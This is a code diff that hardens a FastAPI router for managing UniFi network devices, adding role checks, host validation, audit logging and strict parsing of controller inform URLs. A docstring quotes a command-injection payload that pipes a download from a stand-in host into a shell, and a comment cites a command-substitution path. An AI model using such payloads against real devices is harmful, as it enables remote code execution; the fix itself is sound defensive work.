@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import logging
+import re
 
 from fastapi import APIRouter, Depends, Request
 from fastapi.responses import JSONResponse
@@ -14,6 +15,7 @@ from app.core.exceptions import (
     NotFoundError,
     ValidationError,
 )
+from app.core.validation import validate_host
 from app.models.user import Role, User
 from app.web.middleware.auth import (
     get_current_user,
@@ -52,7 +54,7 @@ async def unifi_test(request: Request, user: User = Depends(get_current_user)):
 
 
 @router.post("/unifi/test-device")
-async def unifi_test_device(request: Request, user: User = Depends(get_current_user)):
+async def unifi_test_device(request: Request, user: User = Depends(require_role(Role.technician))):
     """Test direct connectivity to a standalone UniFi device."""
     from app.modules.unifi_audit.client import UniFiDirectDevice
 
@@ -70,35 +72,76 @@ async def unifi_test_device(request: Request, user: User = Depends(get_current_u
         return result
 
 
+def _validated_inform_url(raw: str) -> str:
+    """Normalise and validate a controller inform URL.
+
+    The old check was ``startswith("http")`` and ``endswith("/inform")``, which
+    a payload like ``http://x/;curl evil|sh #/inform`` satisfies — and the
+    result was interpolated into a root shell command on the device. Parse it
+    properly instead: scheme, host through the same validator the rest of the
+    app uses, and a path that *ends* with /inform (UniFi's own proxy form is
+    /proxy/network/inform, so an equality check would reject a legitimate URL).
+    """
+    from urllib.parse import urlparse
+
+    from app.core.validation import validate_host
+
+    url = raw.strip()
+    if not url:
+        raise ValidationError("Controller URL er påkrevd")
+    if "://" not in url:
+        url = "http://" + url
+    if not url.rstrip("/").endswith("/inform"):
+        url = url.rstrip("/") + "/inform"
+
+    parsed = urlparse(url)
+    if parsed.scheme not in ("http", "https"):
+        raise ValidationError("Controller URL må bruke http eller https")
+    if not parsed.hostname:
+        raise ValidationError("Controller URL mangler vertsnavn")
+    validate_host(parsed.hostname, "controller_url")
+    if parsed.query or parsed.fragment or parsed.params:
+        raise ValidationError("Controller URL kan ikke inneholde query eller fragment")
+    # Restrict the path to unreserved URL characters. Without this, a path like
+    # /$(id)/inform parses cleanly and ends with /inform — shlex.quote at the
+    # command boundary neutralises it, but there is no reason for the route to
+    # accept a string that is obviously not an inform endpoint.
+    if not re.fullmatch(r"[A-Za-z0-9._~/-]*/inform", parsed.path):
+        raise ValidationError("Controller URL må peke på /inform")
+    port = f":{parsed.port}" if parsed.port else ""
+    # Rebuild from the parsed parts so nothing outside them survives.
+    return f"{parsed.scheme}://{parsed.hostname}{port}{parsed.path}"
+
+
 @router.post("/unifi/set-inform")
-async def unifi_set_inform(request: Request, user: User = Depends(get_current_user)):
+async def unifi_set_inform(request: Request, user: User = Depends(require_role(Role.technician))):
     """Set inform URL on a direct UniFi device to adopt it to a controller."""
+    from app.core.activity_log import log_activity
     from app.modules.unifi_audit.client import UniFiDirectDevice
 
     body = await request.json()
     host = body.get("host", "").strip()
     username = body.get("username", "ubnt").strip()
     password = body.get("password", "ubnt").strip()
-    controller_url = body.get("controller_url", "").strip()
 
     if not host:
         raise ValidationError("Host/IP er påkrevd")
-    if not controller_url:
-        raise ValidationError("Controller URL er påkrevd")
+    validate_host(host, "host")
+    controller_url = _validated_inform_url(body.get("controller_url", ""))
 
-    # Ensure the URL ends with /inform
-    if not controller_url.endswith("/inform"):
-        controller_url = controller_url.rstrip("/") + "/inform"
-    if not controller_url.startswith("http"):
-        controller_url = "http://" + controller_url
-
+    log_activity(
+        "unifi_set_inform",
+        detail=f"Satte inform-URL på {host} til {controller_url}",
+        user=user.username,
+    )
     async with UniFiDirectDevice(host, username, password) as dev:
         return await dev.set_inform(controller_url)
 
 
 @router.post("/unifi/reboot-device")
-async def unifi_reboot_device(request: Request, user: User = Depends(get_current_user)):
+async def unifi_reboot_device(request: Request, user: User = Depends(require_role(Role.technician))):
     """Reboot a direct UniFi device."""
+    from app.core.activity_log import log_activity
     from app.modules.unifi_audit.client import UniFiDirectDevice
 
     body = await request.json()
@@ -108,14 +151,19 @@ async def unifi_reboot_device(request: Request, user: User = Depends(get_current
 
     if not host:
         raise ValidationError("Host/IP er påkrevd")
+    validate_host(host, "host")
 
+    # Taking a customer's access point down is disruptive and, until now,
+    # anonymous — this router recorded nothing at all.
+    log_activity("unifi_reboot_device", detail=f"Startet {host} på nytt", user=user.username)
     async with UniFiDirectDevice(host, username, password) as dev:
         return await dev.reboot()
 
 
 @router.post("/unifi/device-config")
-async def unifi_device_config(request: Request, user: User = Depends(get_current_user)):
+async def unifi_device_config(request: Request, user: User = Depends(require_role(Role.technician))):
     """Dump running config from a direct UniFi device."""
+    from app.core.activity_log import log_activity
     from app.modules.unifi_audit.client import UniFiDirectDevice
 
     body = await request.json()
@@ -125,13 +173,15 @@ async def unifi_device_config(request: Request, user: User = Depends(get_current
 
     if not host:
         raise ValidationError("Host/IP er påkrevd")
+    validate_host(host, "host")
 
+    log_activity("unifi_device_config", detail=f"Hentet konfigurasjon fra {host}", user=user.username)
     async with UniFiDirectDevice(host, username, password) as dev:
         return await dev.get_config_dump()
 
 
 @router.post("/network/scan")
-async def network_scan_subnet(request: Request, user: User = Depends(get_current_user)):
+async def network_scan_subnet(request: Request, user: User = Depends(require_role(Role.technician))):
     """Scan a subnet for UniFi devices."""
     from app.modules.unifi_audit.scanner import scan_subnet
 
